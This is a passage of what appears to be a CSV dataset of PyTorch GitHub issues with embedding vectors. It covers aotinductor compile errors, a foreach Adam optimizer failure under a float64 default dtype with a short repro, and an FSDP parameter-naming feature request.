 -1.73315465e-01  5.27796522e-03 -1.21443562e-01 -2.27501243e-01
 -1.07682861e-01 -3.36211994e-02 -1.15667403e-01 -5.97413406e-02
  2.51426883e-02  5.34369349e-02 -6.20723516e-02 -2.93161303e-01
  3.99760485e-01  2.06763580e-01  7.55544752e-02  2.97717720e-01
 -7.33330771e-02  1.16641326e-02 -1.50329113e-01  2.83542395e-01
 -4.14529711e-01 -7.75866881e-02 -3.90869379e-02 -1.70186669e-01
  1.17816746e-01 -6.80141747e-02 -8.00078511e-02 -1.42918944e-01
 -1.94676518e-02  1.51353721e-02 -3.16841602e-01 -2.75187157e-02
  4.53398228e-01 -5.63431904e-02  2.90296823e-02  4.36921455e-02
  1.55510716e-02 -1.47929877e-01  1.78258091e-01  6.70665950e-02
  4.27588485e-02  1.23492725e-01 -9.72475298e-03  3.00378084e-01
  2.33953252e-01  1.25373498e-01 -3.44009668e-01  2.12953568e-01
  6.50721788e-02 -8.14224333e-02  2.39391521e-01 -2.36008674e-01
  3.23370636e-01  1.45112053e-02  4.06501621e-01  2.29233243e-02
  4.95211661e-01 -1.61353856e-01 -1.10196844e-01  1.38724357e-01
  1.55824631e-01  1.74609572e-01  3.07927206e-02  3.81868124e-01
  2.11050481e-01 -3.28053236e-01 -4.50759009e-02 -3.93105924e-01
 -3.55860561e-01  1.15154929e-01 -3.08205128e-01  3.68903726e-01
  1.16706245e-01  5.23316190e-02 -3.28710169e-01  1.65987059e-01
  7.58124962e-02 -2.45043561e-01 -1.45399407e-01 -3.11075803e-02
  4.06866595e-02  4.28235121e-02  4.07000557e-02 -1.08073361e-01
 -1.64241970e-01  2.41328657e-01  2.94345856e-01  2.68412810e-02
  5.03188789e-01 -4.96387720e-01  5.35316318e-02  3.18473786e-01
 -1.77487731e-01  2.35329434e-01 -2.63632417e-01  2.07960233e-01
 -1.09500602e-01  4.60272968e-01  2.13959739e-02  2.06881538e-01
 -1.83309689e-01 -1.59639671e-01 -2.01381147e-02  6.42229384e-03
  3.42666447e-01 -3.95462010e-03 -1.97082013e-01 -2.67912537e-01
  7.12729394e-02  4.85810265e-02  7.46894926e-02 -1.51856348e-01
  2.12765574e-01  1.89476877e-01 -6.94739148e-02 -9.87180024e-02
 -2.34223709e-01  1.77927628e-01 -6.14453629e-02 -1.96460366e-01
 -3.42648551e-02 -1.47675574e-01 -8.48478079e-02 -1.72099710e-01
 -1.73884124e-01 -1.26150802e-01  6.59540296e-02  4.95210767e-01
  1.45552948e-01  7.80753791e-02  4.30405885e-02  2.60712117e-01
 -1.08781261e-02  3.99744548e-02 -2.53817797e-01  4.35774624e-02
  1.68708220e-01  2.81035572e-01  9.96262729e-02  3.19524854e-01
 -3.39024365e-01  6.75145090e-02 -4.24293399e-01  1.31317884e-01
  1.41612804e-02 -5.68110719e-02 -2.24192441e-01 -1.99566722e-01
 -4.57950905e-02  3.44506979e-01 -1.87836438e-01  1.10996485e-01
 -1.10457033e-01  1.23795494e-01  2.27658197e-01  3.26024964e-02
 -1.62751414e-04  1.09425418e-01  1.81808010e-01  2.01908231e-01
  2.31873356e-02  3.53661031e-01  1.10370860e-01  6.19340204e-02]"
[aotinductor] 14k models: CppCompileError: C++ compile error triaged oncall: pt2,"```
25 errors like: CppCompileError: C++ compile error (example ./generated/test_krrish94_nerf_pytorch.py:SinThetaByTheta # pytest ./generated/test_krrish94_nerf_pytorch.py -k test_001)
```

cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-2.28590742e-01 -5.38104355e-01 -7.06743076e-02  4.47526053e-02
  1.02513075e-01 -2.06108809e-01 -2.02141881e-01  1.09898284e-01
 -3.19482148e-01 -8.16446543e-02  3.97260666e-01 -3.89417410e-01
 -1.21139057e-01  9.96826366e-02 -1.00259602e-01  2.79053580e-02
 -1.58420235e-01 -4.70856428e-01  1.05265230e-01  1.32583678e-01
  2.27168221e-02  2.84871496e-02 -4.35370430e-02  1.66897804e-01
 -1.39081523e-01 -6.70199096e-02 -7.10614473e-02 -4.06397492e-01
 -1.61014229e-01  1.74888223e-01  4.51412052e-01 -1.38860226e-01
 -1.71286002e-01 -6.31426126e-02  3.10478985e-01  5.05379103e-02
 -2.07705677e-01 -1.03091940e-01 -2.16831192e-01  1.78563267e-01
  1.66251287e-02  1.84396386e-01  3.65612656e-02  1.01826377e-02
 -2.41929054e-01 -2.43814453e-01 -2.89593935e-01  2.01414615e-01
 -4.23233807e-01 -8.92469063e-02 -7.64199421e-02  1.97432458e-01
 -2.50290513e-01 -5.85828364e-01  9.08416957e-02 -3.32241774e-01
 -4.01347801e-02  2.48290375e-01  5.91258332e-02  3.57490294e-02
  2.78627515e-01 -1.30091369e-01 -9.09550637e-02 -7.08023906e-02
  2.43635416e-01  2.37852439e-01  2.77473897e-01  4.55729142e-02
  3.52991283e-01 -7.37585723e-02 -1.96871772e-01  9.17265490e-02
 -4.97074500e-02 -2.74604827e-01  6.49387613e-02 -9.85536911e-03
 -2.76460707e-01  2.01702654e-01 -6.45543188e-02 -2.89768398e-01
  1.52365062e-02  7.48820975e-02 -2.12978069e-02  2.89046429e-02
  2.18148623e-02 -4.94331457e-02  1.88378334e-01 -1.27975583e-01
  4.42732483e-01 -5.70962280e-02  4.00505304e-01  4.76802327e-03
 -3.38683367e-01  3.45286369e-01 -4.20084894e-02  4.15192068e-01
 -3.91733684e-02 -9.02306736e-02 -2.01215625e-01 -1.28518403e-01
 -5.91187552e-03 -6.37590885e-02 -3.65209758e-01  2.83504426e-01
  7.51499683e-02 -3.49810928e-01  1.69784695e-01 -3.24422047e-02
  2.56638557e-01  5.84782660e-02  1.50387604e-02 -2.01777983e-02
  1.21779680e-01 -1.07176989e-01  2.50509918e-01  2.65551090e-01
  1.06579207e-01  2.36828566e-01 -1.55835867e-01  1.94509715e-01
  8.30440819e-02 -2.77213395e-01  1.69537306e-01  2.35047862e-02
  1.19697921e-01  1.11361310e-01 -2.55404115e-01  3.13887186e-02
  1.49862006e-01 -1.43198460e-01  2.59740055e-01 -1.56625032e-01
  8.91650543e-02 -1.26363426e-01  1.31081372e-01  1.39309630e-01
 -1.88810885e-01 -4.09136891e-01 -2.18723148e-01 -4.65360612e-01
 -1.29671663e-01  1.60471439e-01 -1.06015563e-01 -3.07489544e-01
  4.42993529e-02  5.78995198e-02 -2.01423228e-01  2.57619023e-01
  3.53416428e-02  2.51333266e-02  4.49240115e-03 -1.14295028e-01
 -2.05924034e-01  3.19989085e-01  2.15638340e-01  1.21056989e-01
  2.57299125e-01 -2.49603391e-02  6.28425181e-02 -2.48418882e-01
 -1.95264310e-01  4.39570874e-01  6.57851845e-02  2.79733557e-02
  2.41212517e-01  3.12431939e-02 -2.04901963e-01 -1.23783857e-01
 -7.52736554e-02 -1.58068165e-01 -8.18320736e-02 -2.63116583e-02
  4.62843254e-02 -2.55585730e-01  9.45382267e-02 -1.02791533e-01
 -2.15525746e-01 -4.33382541e-01  1.57239690e-01  2.77692795e-01
  3.69049430e-01  1.85654819e-01  3.34865212e-01  5.00748716e-02
 -5.46371192e-02 -6.40741736e-03  2.94500083e-01 -7.12405220e-02
  1.81389779e-01  9.26385522e-02 -8.72446522e-02 -7.16482103e-02
 -5.16382009e-02  1.24301771e-02 -1.78191125e-01 -2.84928441e-01
  1.81660563e-01  2.13052720e-01  2.74646729e-02  2.12242097e-01
 -2.64938436e-02  6.56490773e-02  2.24327624e-01 -3.41811366e-02
 -1.24294028e-01 -1.38613462e-01 -2.36959159e-01 -2.11120784e-01
 -1.31406680e-01  2.23307565e-01 -2.30184838e-01 -4.69948471e-01
  1.33062694e-02 -3.96478176e-01 -4.62420821e-01  2.78307080e-01
  7.47938678e-02 -1.45236686e-01  2.90083051e-01  1.10687073e-02
  1.03439093e-01 -2.03554869e-01 -2.82805543e-02 -1.56653643e-01
  2.12645680e-02  7.88060874e-02 -2.36468777e-01 -1.89460933e-01
 -6.26649857e-02  2.60426439e-02  1.50951184e-02 -1.59217224e-01
  4.31695819e-01  7.97222555e-02  9.49678272e-02 -4.81581204e-02
 -3.61786000e-02 -1.19201474e-01  2.81283915e-01  1.25507370e-01
 -2.97948867e-01 -4.34940606e-02  1.74370036e-02 -4.58787322e-01
  5.04163429e-02 -2.89387226e-01 -6.65649772e-02  1.66509990e-02
 -6.76992461e-02  2.51311213e-01 -2.90527552e-01 -8.82006660e-02
  1.67240277e-01  1.60245486e-02  5.66012561e-01  1.26907498e-01
 -1.68056428e-01  3.44370678e-02 -1.06635526e-01 -1.06588624e-01
  2.28478417e-01  2.25377217e-01 -1.94533482e-01  3.23541882e-03
  6.62422776e-02  9.10735726e-02  2.74701305e-02  1.06128871e-01
 -5.01532853e-02 -1.22686133e-01  5.64402223e-01 -7.07718015e-01
  3.57764840e-01  3.94831933e-02  2.33251408e-01 -1.88323623e-03
  4.76602256e-01 -5.80049902e-02 -1.71860456e-02  2.26548180e-01
  1.26222610e-01  2.67520845e-01  1.73346043e-01 -2.61837691e-02
 -3.06873005e-02 -3.16092938e-01 -1.23694420e-01 -1.40232623e-01
 -2.56967902e-01  5.29910251e-02 -1.62490830e-01  1.39107749e-01
  3.16128224e-01  5.61205558e-02 -1.36058360e-01  4.86037791e-01
 -1.77746579e-01 -2.51611639e-02  1.09406903e-01 -4.01343517e-02
 -3.01071078e-01  6.02898374e-02 -5.60534559e-02  1.75284415e-01
 -6.73463792e-02  6.12791851e-02  1.07363679e-01  7.14640766e-02
  3.42339039e-01 -6.08195662e-01  3.77205819e-01  2.74048448e-01
 -1.41150147e-01  3.95167410e-01 -1.76067889e-01  1.35951817e-01
 -1.32445931e-01  6.12656534e-01  2.17519701e-01 -1.13429278e-02
  1.26806408e-01 -8.88770819e-02 -4.67066586e-01 -4.99914885e-02
  3.62700969e-01  1.65399432e-01 -4.03078169e-01 -1.89480335e-01
  7.08327219e-02 -1.13629609e-01 -3.76527794e-02  1.15326077e-01
  5.62006086e-02  2.17818767e-01 -5.27506433e-02 -5.17991036e-02
 -1.04027383e-01  7.61907920e-03  3.40212062e-02 -1.72471642e-01
  6.77433759e-02  3.31569202e-02  1.68455802e-02 -1.47038937e-01
 -1.23244442e-01 -3.38219143e-02  2.39334837e-01  5.25763154e-01
 -2.15309799e-01  1.53994948e-01 -2.50554644e-04  1.20163478e-01
 -3.59536201e-01 -4.64460924e-02  2.30776947e-02  4.66602147e-01
  3.68196890e-02 -7.46705830e-02  3.92347246e-01  5.41218162e-01
 -2.66942203e-01 -6.33132458e-02 -2.57519931e-01  9.57920924e-02
  2.05620408e-01 -6.60258532e-02 -3.84244591e-01 -3.09200406e-01
  1.76667452e-01  4.10771370e-01 -4.25939798e-01  3.60506594e-01
 -1.44801021e-01 -2.61465404e-02  3.36886108e-01 -8.73983726e-02
 -1.72916800e-04  1.12484340e-02 -1.01655917e-02 -9.65097547e-02
  1.52795643e-01  1.25714436e-01  1.88875332e-01  2.04657018e-03]"
[aotinductor] 14k models: TypeError: make_boxed_func..g() missing 1 required positional argument: 'args'  triaged oncall: pt2,"347 errors like: TypeError: make_boxed_func..g() missing 1 required positional argument: 'args' (example ./generated/test_ludwig_ai_ludwig.py:SequenceReducer # pytest ./generated/test_ludwig_ai_ludwig.py -k test_015)

cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-3.04591894e-01 -1.76676065e-01 -1.64961010e-01  4.02736999e-02
 -1.20741457e-01  2.82611270e-02  1.99001029e-01  8.37173164e-02
 -9.36378688e-02 -5.67919947e-02  2.61384845e-01 -1.12717353e-01
  1.30263478e-01  5.11243120e-02  1.16698079e-01  1.02463886e-02
 -1.19677082e-01 -1.79721937e-01  5.08780591e-02  2.15157881e-01
  1.14071809e-01 -1.92605048e-01 -2.36107912e-02 -8.87261480e-02
 -1.00486308e-01 -2.96893775e-01  3.78490761e-02 -9.04363394e-02
  6.27677590e-02 -1.24111742e-01  1.94045022e-01  1.41708761e-01
  2.79152039e-02  3.96619178e-02  2.51478136e-01 -1.12042174e-01
 -2.71253109e-01 -1.40191913e-01 -9.55259874e-02  2.13610351e-01
 -1.47497967e-01  3.68951857e-02  2.34813951e-02  1.15419760e-01
 -9.47358608e-02 -1.97159469e-01 -1.69658095e-01  2.63426304e-01
 -2.04804733e-01  1.14683881e-01 -1.78344697e-01  2.69656032e-01
 -1.37543648e-01 -2.60567814e-01 -7.38122463e-02 -2.20241651e-01
 -1.13074794e-01  7.64048696e-02 -4.99977358e-02  3.76823507e-02
  2.59882569e-01 -4.32033725e-02 -1.23227403e-01  2.57176310e-02
 -1.49875917e-02  1.65194437e-01  3.04919761e-02 -3.33669521e-02
  4.38205212e-01 -6.65000007e-02  1.59800351e-01  5.56898043e-02
 -4.18926299e-01 -4.89488840e-02  1.10555544e-01  2.22709943e-02
 -3.04953098e-01  7.47447684e-02  8.18024948e-03  3.66859511e-02
 -2.68925041e-01 -1.96050048e-01 -4.58147787e-02 -1.81095004e-02
  2.07086094e-02 -2.23665148e-01  1.93272859e-01 -7.46490061e-02
  2.42417067e-01 -4.34877202e-02  4.22617018e-01 -1.77125126e-01
 -1.72180504e-01  2.30925024e-01  1.17973596e-01  4.52468336e-01
  2.06827819e-02  3.32714058e-02 -1.92673177e-01 -1.03256740e-01
  2.57208347e-02  2.77940631e-02 -6.93926662e-02  3.77081454e-01
  7.19295964e-02 -1.13940783e-01 -1.06763719e-02 -1.75854534e-01
  1.59657896e-01  1.13365963e-01 -4.31152172e-02 -1.60458535e-01
  2.58239776e-01  2.31506769e-04 -5.01696765e-02  3.23605478e-01
  1.83827013e-01  1.43285900e-01 -2.58555055e-01  1.38367862e-01
  4.18142267e-02 -4.64790538e-02  4.77689579e-02  2.99955726e-01
  1.13947988e-01  9.54864472e-02 -1.93917006e-01  5.23631498e-02
 -3.73516977e-02 -2.43275791e-01  4.22713697e-01  6.57891668e-03
  2.26381291e-02 -2.10833505e-01 -7.79898316e-02 -8.73395130e-02
 -1.61391199e-01 -2.25392714e-01 -3.20405960e-01 -1.61795855e-01
 -1.15056284e-01 -8.85574222e-02 -3.31321359e-02 -1.44434214e-01
  7.99613073e-02  8.17365721e-02 -2.15179324e-01  2.19341308e-01
 -4.23337296e-02  1.05293542e-02  3.63662019e-02  4.66658324e-02
 -1.79230660e-01  3.99724603e-01  2.92997770e-02  2.74279296e-01
  2.46907189e-01 -3.14019807e-02  1.73377037e-01 -3.07631403e-01
 -1.71751201e-01  3.32731515e-01  2.58984089e-01  1.56820133e-01
  2.60033816e-01  4.02682051e-02 -1.20343857e-01 -4.51246276e-02
 -2.47455075e-01  5.21129519e-02  6.52646348e-02  1.74354643e-01
 -1.42647356e-01 -7.92696849e-02  4.54047807e-02  8.11845884e-02
 -2.51067847e-01 -4.71844047e-01 -1.34599209e-01  4.00946736e-01
  4.90359634e-01  2.96920419e-01  3.10734630e-01  2.20927358e-01
  6.96761906e-02  2.47756809e-01  3.16805661e-01 -6.78307191e-02
  2.70562619e-03  7.89359584e-02  1.60493165e-01  1.14037201e-01
  1.02956891e-01  6.32230341e-02 -3.86627376e-01 -3.14048767e-01
  1.59668058e-01 -1.21685088e-01  2.53551044e-02  2.88381308e-01
 -1.87431611e-02 -5.72234280e-02  1.91577315e-01 -3.09475064e-01
 -2.39456054e-02 -5.98448366e-02 -2.92032391e-01 -3.48239303e-01
 -6.92989156e-02  1.16472773e-01 -3.04581523e-01 -3.88188064e-01
  7.45643154e-02 -4.49002206e-01 -3.87538850e-01  6.83684871e-02
  2.85003006e-01 -5.52183576e-02  5.18620573e-02  1.32101607e-02
 -2.97281772e-01 -3.74754444e-02 -6.49349242e-02 -2.81185389e-01
 -1.97800577e-01 -2.75409315e-04 -3.08203340e-01 -8.54419470e-02
  1.76376939e-01  7.52791166e-02  6.17876649e-03 -2.62888193e-01
  3.00777107e-01  8.08528960e-02  1.74701631e-01 -1.09662116e-01
  1.33088604e-03 -5.59601635e-02  3.42684209e-01  4.30114157e-02
 -1.67852357e-01  4.36463915e-02 -5.99507913e-02 -5.92156723e-02
 -7.27768391e-02 -3.42098296e-01 -2.24418968e-01 -1.95510052e-02
 -2.39727125e-01  3.02191734e-01 -3.94023478e-01 -2.11374491e-01
  2.44954914e-01  1.77974507e-01  2.74372280e-01  9.42470506e-05
 -1.05605774e-01  1.58444479e-01  1.31708235e-01 -1.68205932e-01
  2.06030399e-01  3.84256065e-01 -1.41941413e-01  5.40997162e-02
  1.87506557e-01 -1.66931562e-03 -6.76829219e-02  1.92590237e-01
  2.23642126e-01 -4.64487225e-02  4.64239299e-01 -5.28477609e-01
  1.81111962e-01 -5.86126484e-02  2.60646567e-02 -1.90941364e-01
  2.30829343e-01 -1.10950336e-01 -8.61380547e-02 -7.00483620e-02
 -1.38873100e-01  2.77293082e-02  1.62724599e-01  9.62284952e-02
  7.43421167e-02 -6.64899573e-02  5.42698279e-02 -1.22598499e-01
 -4.05772269e-01 -3.18155318e-01 -3.47836256e-01  2.85114348e-01
  7.41856843e-02 -6.92451373e-02 -3.03869516e-01  4.67319936e-02
  8.49946216e-02  1.93971798e-01  1.65372655e-01  6.45198897e-02
 -1.47613855e-02  3.56961310e-01  7.70362280e-03  2.98464717e-03
 -2.67099172e-01  1.71309173e-01  2.67682552e-01 -8.78252238e-02
  4.05269504e-01 -3.97875234e-02  2.97729433e-01  2.67192245e-01
 -4.71511334e-02  2.04489693e-01 -2.94597130e-02  3.10504913e-01
  8.77068490e-02  5.01093805e-01  7.05093741e-02 -9.16769728e-02
 -1.37663454e-01 -1.82313621e-01 -3.00675511e-01  2.33868863e-02
  2.10849002e-01 -3.96839827e-02 -2.10142314e-01 -8.48768726e-02
 -2.05301940e-02 -1.37474686e-01 -5.78631647e-04  2.66169071e-01
 -1.41810268e-01  8.52217451e-02 -2.25018896e-02 -8.74833018e-02
 -1.69731587e-01  3.82417977e-01  6.67679757e-02  1.09564453e-01
  1.56603292e-01  9.22931433e-02  1.70907408e-01 -3.02184433e-01
 -1.63254708e-01 -1.40748080e-02 -1.23872265e-01  2.34949172e-01
 -1.60600990e-01  2.70213485e-01  1.57313168e-01  1.53769091e-01
 -3.08564365e-01  6.65475652e-02 -1.57811955e-01  2.72167146e-01
 -2.39740349e-02 -1.25775605e-01  8.65958780e-02  4.20231521e-01
 -2.87067235e-01 -6.35221377e-02 -2.60078549e-01 -1.22806288e-01
  2.36458570e-01  8.49142224e-02 -1.50633901e-01 -3.09044510e-01
  2.79381514e-01  1.52421445e-01 -5.47172785e-01 -1.70441717e-02
 -1.08693205e-02 -1.94188863e-01  2.18215689e-01  1.13611460e-01
  8.95639062e-02  1.09386928e-02  1.66105777e-01 -1.70902818e-01
 -1.30384967e-01 -1.03102729e-01 -1.17419414e-01  1.62785739e-01]"
Foreach optimizers don't work with torch.set_default_dtype(torch.float64) module: optimizer,"```python
import torch

torch.set_default_dtype(torch.float64)
device = ""cuda""
model = torch.nn.Linear(200, 1, bias=True).to(device)
opt = torch.optim.Adam(model.parameters(),lr=0.001) 
x = torch.rand(1, 200).to(device)
model(x).sum().backward()
opt.step()
```
Error:
```
RuntimeError: Tensors of the same index must be on the same device and the same dtype except `step` tensors that can be CPU and float32 notwithstanding
```
Foreach is implicitly True because we are using cuda. Error goes away if we explicitly set foreach=False.

Versions: main

(originally reported [here](https://discuss.pytorch.org/t/tensors-of-the-same-index-must-be-on-the-same-device-and-the-same-dtype-except-step-tensors-that-can-be-cpu-and-float32-notwithstanding/190335/2))

cc @vincentqb @jbschlosser @albanD @janeyx99 @crcrpar",False,"[-0.43434966 -0.00323401 -0.359194    0.00546251  0.05756944 -0.0202556
 -0.13496931  0.37778026 -0.4322592  -0.04853697 -0.23775375  0.06749426
  0.10795757  0.14894505 -0.11359131  0.14987853  0.09375729 -0.18187672
 -0.10798075 -0.06461887  0.27518967 -0.10013611 -0.08069547 -0.14142989
 -0.01821331  0.06937372 -0.01256123  0.01806624  0.42102653  0.03275391
 -0.04102039 -0.3631466  -0.23078296  0.17382008  0.14200002 -0.02621991
 -0.45315295 -0.08404632 -0.15698555  0.03732677  0.22326629  0.24449116
  0.07999848  0.01406584 -0.02277808  0.03257592 -0.02617276  0.2711072
 -0.21293491 -0.16651613 -0.00145391  0.12237991 -0.19099958 -0.2940053
 -0.06236741 -0.26293796 -0.297481   -0.12925868  0.07361312 -0.5212878
  0.20764697  0.17839341 -0.1414397  -0.03108785  0.17739858  0.05520563
 -0.06954752  0.0910821   0.59216166  0.01030251  0.20405333 -0.01084512
  0.05574786 -0.05862875 -0.12161312 -0.24310671 -0.24547441  0.19863549
 -0.28046066 -0.3346725   0.17487116 -0.19241849 -0.2562803   0.1010177
  0.1538614  -0.10051987  0.4701581  -0.08585153  0.28265136  0.31038928
  0.1055974   0.34516335 -0.14238715  0.15309566 -0.31308776  0.093656
  0.34335575 -0.4238512  -0.11650219 -0.11053424 -0.18200761 -0.6992319
 -0.23161998  0.20798653  0.14401498 -0.33273494 -0.08739725  0.35402644
  0.11434678  0.03949105  0.13875556  0.02719618 -0.03431642 -0.02065578
 -0.09856042 -0.19433294 -0.43226576 -0.10909809 -0.09750459  0.02433933
  0.12252283  0.31202954  0.4056655   0.36088565  0.4954518  -0.07138648
 -0.1489599  -0.09444812 -0.24050996  0.15245667  0.06166748 -0.18905108
 -0.28283405 -0.05728928  0.31562132  0.18775888 -0.37574178  0.14431703
 -0.18972915  0.1050379  -0.3197061   0.20503476 -0.24125399 -0.28860357
  0.10850892  0.15479673 -0.27057695  0.02931579  0.06171518 -0.02882462
  0.05609469 -0.05193828 -0.63027155  0.2558374   0.17093538  0.21672809
  0.15576506  0.15460244  0.45192885 -0.17334005  0.19851035  0.20642628
  0.21783319 -0.16331725 -0.03196236  0.0678739  -0.08474572  0.10663269
 -0.37469757  0.46469617  0.16255361 -0.26315093 -0.16159607 -0.06306535
  0.07160578 -0.01638776 -0.07579042 -0.3546495  -0.25744832  0.12187392
  0.49262425  0.5054548   0.09085418 -0.05908631  0.07637151 -0.01687628
  0.39143896 -0.11669175 -0.2407326  -0.21465054 -0.3776247  -0.42597103
  0.18302795  0.2780111  -0.0039087   0.12396935  0.00989067 -0.2462206
  0.07638284 -0.1329917  -0.18145552  0.10724732 -0.2057794  -0.16531797
  0.23758563  0.2879878  -0.28373545 -0.38798898 -0.26442075  0.22741987
 -0.3016038  -0.18567273  0.02172599 -0.16029945  0.05126995 -0.10078475
 -0.14857712  0.06124746 -0.04092307  0.19295117  0.43395895 -0.02377995
  0.08852039 -0.28646064  0.0284942  -0.05856446 -0.1561102   0.04263749
  0.15128793 -0.10129894  0.02422554 -0.50413287  0.32190657  0.0564153
 -0.05471614  0.18449299 -0.11196078 -0.14364374 -0.24862069 -0.14943692
  0.13314924  0.13932684  0.26855412 -0.22423281 -0.02200754  0.13958997
 -0.36828884 -0.08645122 -0.15520367 -0.10609803  0.03502833  0.15217462
 -0.23206401 -0.09102339  0.06396517  0.2986612  -0.0505188  -0.08700076
 -0.11963643  0.12000322  0.1443947   0.31740665  0.02892045  0.26734978
  0.235968   -0.02834318 -0.2476794  -0.05822349  0.2900117  -0.07294226
  0.0292139  -0.28183874  0.47312486  0.23501524  0.05354395 -0.2421082
  0.2547347  -0.15701741 -0.08472903 -0.39171487  0.25134122  0.17287642
  0.04534032  0.20393193  0.39948928 -0.44628596  0.12373546 -0.10437991
 -0.33450818 -0.03300411 -0.1547651   0.13895452  0.4200307  -0.26635325
 -0.39492562  0.00084858  0.4125061   0.07911776  0.04459507 -0.15386003
 -0.02374193  0.31379902  0.5936955  -0.12720127 -0.11557759  0.0111915
  0.20984492  0.10377333  0.5132037  -0.21566725 -0.0165901  -0.01999008
 -0.15631685  0.30451053 -0.20055357  0.24722883  0.22409418  0.2506023
  0.06875502 -0.01312423 -0.15702984 -0.17953853 -0.02117572  0.12497576
 -0.0975154   0.3346935  -0.30871737  0.0020181  -0.03059933 -0.38760066
  0.31348097  0.09697644  0.2755116   0.25859505 -0.24101071 -0.22530258
 -0.15935186  0.24262956  0.02574927 -0.21382573  0.00433699 -0.08600532
 -0.06690824 -0.49913177 -0.12878057 -0.02456907  0.20912747  0.14347324
 -0.11922266  0.2138528   0.0283378  -0.01869008  0.1658332   0.284522
  0.38442507  0.2774398   0.17588124  0.1580478  -0.04823194  0.18351315
  0.04752549  0.36067745 -0.42269838 -0.28429618  0.11884435 -0.059548
  0.20589073 -0.02744015  0.0025345   0.3857767  -0.15354185  0.10692463
  0.05602153  0.18543722  0.4403873  -0.28727162  0.05848987 -0.03662402
  0.20581326  0.20893213  0.25629327 -0.04032291 -0.22288813  0.0464825 ]"
FSDP: clean names for use_orig_params? oncall: distributed module: fsdp,"### ðŸš€ The feature, motivation and pitch

When use_orig_params=True, I still get names that are prefixed with `_fsdp_wrapped_module` at each nested level. Wonder if we should just strip out the `_fsdp_wrapped_module` and return the exact original local names. 

### Alternatives

_No response_

### Additional context

_No response_

cc @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @osalpekar @jiayisuse @H-Huang @kwen2501 @awgu @penguinwu @fegin",False,"[-0.437765   -0.09482032 -0.259541   -0.21466899  0.12467144 -0.23180494
  0.22002484  0.0325022  -0.35086942 -0.09089068  0.38086706 -0.21248253
  0.09161602  0.16249019  0.225913    0.3026899  -0.3851239  -0.04115457
  0.14814131  0.10030859  0.05776457  0.02215419  0.01352843  0.11120093
  0.15007508  0.17215413  0.06425545  0.02169509  0.03086128 -0.0660538
  0.24523768  0.13250801 -0.24926901  0.03294114  0.27595496  0.23588802
 -0.3856746  -0.00295408 -0.24087393 -0.23339143 -0.16899574 -0.05869468
  0.04484531 -0.13250156 -0.19254372 -0.28309616 -0.3220451   0.27370918
 -0.22144401  0.02542292  0.20087978 -0.10944045 -0.27486378 -0.40698552
  0.20516497 -0.35141808 -0.11086566 -0.1361394  -0.07015325  0.23987477
 -0.17222588 -0.04676239 -0.0261133   0.17457646 -0.02013449  0.00706064
  0.01279772  0.10615726  0.3834628  -0.16210042  0.0861275   0.07362452
 -0.10631941 -0.01894894  0.01034561  0.26196575 -0.27287543  0.02848882
 -0.20617884  0.07658279 -0.18861204 -0.08141896 -0.03753274 -0.09835194
 -0.09396915  0.00408625  0.19824582 -0.29113534  0.32779068  0.01970613
  0.0994883   0.17553517 -0.01486049  0.34686732 -0.05633189  0.15726185
  0.34031415  0.04502105 -0.20092198 -0.06741907 -0.07162206 -0.32552463
 -0.22117391 -0.11923026  0.28716362  0.15396613  0.09289791 -0.41303232
  0.09286095 -0.3001443  -0.19388111 -0.01805543  0.14209613 -0.19102302
 -0.14435272 -0.00412987  0.3015129   0.01483319 -0.0006716  -0.15346509
  0.11462448  0.0194201  -0.01866437 -0.11584526  0.30248684  0.0933679
 -0.07287733 -0.05229277 -0.02886335 -0.12272909  0.22557724  0.2239086
  0.22993949  0.17133853  0.30322316  0.41525722 -0.4292704  -0.22237293
 -0.1689711   0.00193742 -0.00463648 -0.12044654  0.35209864 -0.43717188
  0.333328    0.09528697 -0.27189717  0.10669351 -0.17187552  0.23449036
  0.24878992  0.09056763 -0.05940114  0.27272993 -0.02475837  0.23185654
  0.49771297  0.07337643  0.38875446 -0.40895507  0.10396579  0.5044801
  0.02965727  0.42298076  0.07368417 -0.03161535 -0.43373764  0.01829948
 -0.2807253   0.15412322 -0.17780212 -0.05423211 -0.27930295 -0.23670417
 -0.02776083 -0.06325874 -0.07539089 -0.3041231   0.15386522  0.351512
  0.02441056  0.33218688 -0.09127504  0.09508381 -0.20225155  0.44593906
  0.10357918 -0.12175152 -0.10361747 -0.06737173 -0.36957294 -0.07948762
  0.30121854 -0.03264315  0.23697634 -0.04918493  0.4115981   0.10317033
  0.1919317   0.16328841 -0.09213071 -0.08772636  0.14168291  0.17998101
  0.12642422 -0.13304827  0.25318035 -0.33833313  0.18960658  0.33635807
 -0.03382416 -0.06546268 -0.21872957 -0.1862129  -0.12357692  0.38459927
 -0.1061307   0.08518352 -0.13626148 -0.08615717  0.12005617  0.00929603
 -0.1091726  -0.18099089 -0.1122991   0.15081334 -0.14355034 -0.11757879
 -0.25720835  0.2889814  -0.1337193  -0.1281065   0.2507792   0.0499467
  0.131078   -0.02369102  0.23964095 -0.1987341   0.09511808  0.17831054
 -0.28694195  0.09907757 -0.0812823  -0.0393927   0.1102166   0.07690069
 -0.33274835 -0.10711897 -0.21333179 -0.02343407 -0.18426636 -0.04298552
  0.18204202  0.00713761  0.16795455  0.19049245  0.1479279   0.19884634
  0.02382196 -0.00592166 -0.01494601 -0.05944439  0.29342145  0.30266368
 -0.23472518  0.01653554 -0.30453432  0.20024106 -0.15215841 -0.27717137
 -0.33360055 -0.2417459   0.29189366 -0.18091208 -0.06358597 -0.1549604
 -0.0497654  -0.3849255   0.02404701 -0.10840437 -0.23456165  0.06120767
  0.32361603  0.14507368  0.2402057  -0.30437928 -0.09706174 -0.07612742
 -0.24776922 -0.07126472 -0.1373971  -0.05638679  0.03338903 -0.36065358
 -0.18314871  0.26913252  0.09307981 -0.08060755 -0.15150745 -0.0079923
  0.16498652 -0.12032063 -0.29548818  0.06960028 -0.04160056 -0.21462634
  0.06636684  0.21531925  0.1705378  -0.24398313  0.21815158 -0.16326521
 -0.17095232  0.31334352  0.04961211  0.03648879  0.06593734  0.5958654
  0.14599782  0.30436075 -0.1475642  -0.2673274  -0.0800436   0.15778676
  0.10091928  0.28798854 -0.25644794  0.02166144  0.04729608  0.14684515
  0.1652247   0.25067317 -0.14008145 -0.00147855 -0.40108234  0.00637683
 -0.20853195  0.485377   -0.11281796  0.08612876 -0.30041957 -0.01693344
 -0.1871162  -0.29742342 -0.02627191 -0.26437786  0.09577745  0.50252545
  0.28798267 -0.14348485  0.0255823  -0.03839272 -0.09046961  0.2828626
